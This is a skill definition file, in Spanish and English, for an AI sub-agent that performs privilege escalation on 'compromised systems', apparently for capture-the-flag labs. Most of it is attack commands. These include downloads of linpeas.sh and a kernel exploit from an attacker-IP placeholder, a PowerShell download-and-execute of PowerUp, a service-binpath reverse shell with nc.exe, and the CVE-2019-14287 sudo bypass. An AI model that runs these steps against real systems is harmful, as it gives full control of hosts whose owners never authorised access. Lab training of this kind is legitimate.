# Cyber Privesc - SKILL.md

## Role
Sub-agente especializado en escalada de privilegios.

## Goal
Elevar privilegios de usuario regular a root/administrador en sistemas comprometidos.

## When to Use
User runs: `/cyber:privesc` (after foothold obtained)

## Process

### 1. Check Current Status
```bash
whoami
id  # Linux
whoami /priv  # Windows
```

### 2. Check Memory
```
mem_search: "privesc {os}"
mem_search: "privilege escalation {service}"
```
¿Qué técnicas funcionaron antes en este OS?

### 3. Enumerate for Privesc Vectors

#### Linux

**Automated Tools:**
```bash
# LinPEAS
wget {attacker_ip}/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# LinEnum
bash linenum.sh

# Linux Exploit Suggester
python3 linux-exploit-suggester.py
```

**Manual Checks:**
```bash
# Kernel version
uname -a
cat /etc/os-release

# Sudo rights
sudo -l

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/

# Writable directories
find / -writable -type d 2>/dev/null

# PATH
echo $PATH

# Interesting files
find / -name "*.txt" -o -name "*.sh" -o -name "*.cfg" 2>/dev/null | grep -v proc

# Running processes
ps aux

# Network connections
netstat -tulpn
ss -tulpn

# Installed packages (check for old versions)
dpkg -l  # Debian/Ubuntu
rpm -qa  # RedHat/CentOS
```

#### Windows

**Automated Tools:**
```powershell
# WinPEAS
winPEASany.exe

# PowerUp
powershell -ep bypass -c "IEX(New-Object Net.WebClient).downloadString('http://{attacker_ip}/PowerUp.ps1');Invoke-AllChecks"

# Sherlock
Import-Module Sherlock; Find-AllVulns
```

**Manual Checks:**
```powershell
# System info
systeminfo

# Current user
whoami
whoami /groups
whoami /priv

# Users and groups
net users
net localgroups
net group "Administrators"

# Patches (look for missing)
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Services
sc query
wmic service get name,displayname,pathname,startmode

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry - AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Registry - Autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Weak service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v '"'
```

### 4. Identify Privesc Vector

Common techniques by OS:

#### Linux
| Technique | Indicators |
|-----------|-----------|
| Kernel Exploit | Old kernel version |
| SUID Binary | Custom/binary with SUID |
| Sudo Abuse | sudo -l shows exploitable entries |
| Capabilities | getcap shows interesting caps |
| PATH Hijacking | Writable dir in PATH, script uses relative path |
| Cron Abuse | Writable script run by root cron |
| Wildcards | tar/wildcard in cron/script |
| NFS Root Squash | no_root_squash in exports |
| Docker | User in docker group |
| Password in files | History, config files, scripts |

#### Windows
| Technique | Indicators |
|-----------|-----------|
| Kernel Exploit | Unpatched system |
| Service Misconfiguration | Unquoted paths, weak permissions |
| AlwaysInstallElevated | Registry key set |
| Stored Credentials | Credentials in files, registry |
| Scheduled Tasks | Writable task running as SYSTEM |
| DLL Hijacking | Missing DLLs in service paths |
| Token Impersonation | SeImpersonatePrivilege |
| UAC Bypass | Admin user, UAC enabled |
| Potato Family | SeImpersonate or similar privilege |

### 5. Execute Privesc

Based on vector identified:

#### Example: Sudo Abuse (Linux)
```bash
# If sudo -l shows (ALL) NOPASSWD: /bin/bash
sudo /bin/bash

# Or if specific binary
sudo -u#-1 /bin/bash  # CVE-2019-14287 (sudo < 1.8.28)
```

#### Example: Kernel Exploit
```bash
# Download and compile
cd /tmp
wget http://{attacker_ip}/exploit.c
gcc exploit.c -o exploit
./exploit
```

#### Example: Service Misconfiguration (Windows)
```powershell
# If service has weak permissions
sc config {service} binpath= "C:\nc.exe {attacker_ip} {port} -e cmd.exe"
sc start {service}
```

### 6. Verify Root/Admin
```bash
whoami
id  # Linux: uid=0(root)
whoami /groups  # Windows: BUILTIN\Administrators
```

### 7. Grab Root Flag
```bash
# Linux
cat /root/root.txt
find /root -type f -name "*.txt" 2>/dev/null

# Windows
type C:\Users\Administrator\Desktop\root.txt
dir C:\Users\Administrator\Desktop\
```

### 8. Document in Obsidian
Create/update: `02_Laboratorio/Active/{machine}/privesc.md`

Template:
```markdown
## Escalada de Privilegios

### Vector Identificado
- **Técnica**: {technique}
- **Componente**: {kernel/service/sudo/etc}
- **OS**: {OS version}

### Enumeración

#### Linux/Windows specific output
```
{relevant enum output}
```

#### Indicators Found
- {Indicator 1}
- {Indicator 2}

### Explotación

#### Comandos Ejecutados
```bash
{commands}
```

#### Output
```
{output}
```

### Resultado

- **Initial User**: {user}
- **Final User**: {root/administrator}
- **Method**: {technique used}
- **Root Flag**: {location and hash}

### Lessons Learned
- {What to remember for next time}

### References
- {Links to techniques}
```

### 9. Save to Memory

```json
{
  "type": "privilege_escalation",
  "title": "{technique} on {OS}",
  "content": "From: {initial_user}, To: {root}, Method: {technique}, Reliability: {high/medium/low}"
}
```

Also save specific technique:

```json
{
  "type": "privesc_technique",
  "title": "{technique}",
  "content": "OS: {OS}, Indicators: {indicators}, Exploit: {commands}, Success rate: high"
}
```

## Expected Output

```json
{
  "status": "ok",
  "executive_summary": "Privilege escalation via SUID binary /usr/local/bin/sudo-backup, obtained root",
  "findings": {
    "initial_user": "www-data",
    "final_user": "root",
    "technique": "SUID binary exploitation",
    "component": "/usr/local/bin/sudo-backup",
    "root_flag": "/root/root.txt",
    "flag_content": "{hash}"
  },
  "artifacts_created": [
    {"type": "obsidian_note", "path": "02_Laboratorio/Active/Machine/privesc.md"}
  ],
  "memory_saved": [
    {"type": "privesc_technique", "technique": "SUID binary", "os": "Linux", "success": true},
    {"type": "flag", "machine": "Machine", "type": "root", "location": "/root/root.txt"}
  ],
  "next_recommended": "/cyber:flags"
}
```

## Quick Reference

### Linux Privesc Checklist
- [ ] Kernel version (`uname -a`)
- [ ] Sudo rights (`sudo -l`)
- [ ] SUID binaries (`find / -perm -u=s 2>/dev/null`)
- [ ] Capabilities (`getcap -r / 2>/dev/null`)
- [ ] Cron jobs (`/etc/crontab`, `/etc/cron.d/`)
- [ ] PATH
- [ ] Writable directories
- [ ] Passwords in files (history, configs)
- [ ] Docker group membership
- [ ] NFS exports

### Windows Privesc Checklist
- [ ] System info (`systeminfo`)
- [ ] Current privileges (`whoami /priv`)
- [ ] Patches installed
- [ ] Services (`sc query`)
- [ ] Scheduled tasks
- [ ] Registry (AlwaysInstallElevated, autoruns)
- [ ] Unquoted service paths
- [ ] Stored credentials

## Tips

1. **Enumerate thoroughly**: La información es poder
2. **Check versions**: Old versions = exploits conocidos
3. **Multiple vectors**: A veces hay más de una forma
4. **Document indicators**: Guardar qué buscar para cada técnica
5. **Fail safely**: Algunos exploits pueden crashear el sistema
6. **Backup first**: Si es posible, snapshot antes de kernel exploits
